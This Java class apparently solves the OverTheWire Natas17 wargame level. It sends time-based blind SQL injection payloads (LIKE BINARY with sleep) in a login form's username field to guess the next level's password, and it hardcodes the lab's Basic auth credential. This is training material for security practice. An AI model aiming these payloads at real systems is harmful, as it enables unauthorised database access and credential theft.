package sqlInjection.blind;

import sqlInjection.responseReader.HttpURLConnectionResponseReader;
import sqlInjection.utils.SqlInjectionUtils;
import util.XwwwFormUrlEncoder;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class NatasTotalBlindSqlInjectionPasswordGuesser extends AbstractTotalBlindSqlInjectionPasswordGuesser {

    public NatasTotalBlindSqlInjectionPasswordGuesser(int secondsToSleep,
                                                      int passwordLength,
                                                      HttpURLConnectionResponseReader responseReader,
                                                      OutputStream progressOutputStream) {
        super(secondsToSleep, passwordLength, responseReader, progressOutputStream);
    }

    @Override
    protected List<Character> getAllowedCharacters() {
        return SqlInjectionUtils.getDigitsAndLetters();
    }

    @Override
    protected HttpURLConnection getHttpURLConnection(String body) throws Exception {
        URL url = new URL("http://natas17.natas.labs.overthewire.org/index.php");
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod("POST");
        urlConnection.setRequestProperty("Cache-Control", "max-age=0");
        urlConnection.setRequestProperty("Authorization", "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==");
        urlConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
        urlConnection.setRequestProperty("Origin", "http://natas17.natas.labs.overthewire.org");
        urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36");
        urlConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        urlConnection.setRequestProperty("Referer", "http://natas17.natas.labs.overthewire.org/");
        urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        urlConnection.setDoOutput(true);
        try (OutputStream stream = urlConnection.getOutputStream()) {
            stream.write(body.getBytes(StandardCharsets.UTF_8));
        }
        return urlConnection;
    }

    @Override
    protected String getBodyForFilteringUsefulCharacters(Character passwordCharacter, int secondsToSleep) {
        Map<String, String> formData = new HashMap<>();
        String maliciousUsername = String.format(
                "natas18\" AND IF(password LIKE BINARY \"%%%s%%\", sleep(%d), null);-- ",
                passwordCharacter,
                secondsToSleep);
        formData.put("username", maliciousUsername);
        return XwwwFormUrlEncoder.getDataString(formData);
    }

   protected String getBodyForPasswordGuessing(String passwordBeginning, int secondsToSleep) {
       Map<String, String> formData = new HashMap<>();
       String maliciousUsername = String.format(
               "natas18\" AND IF(password LIKE BINARY \"%s%%\", sleep(%d), null);-- ",
               passwordBeginning,
               secondsToSleep);
       formData.put("username", maliciousUsername);
       return XwwwFormUrlEncoder.getDataString(formData);

    }
}
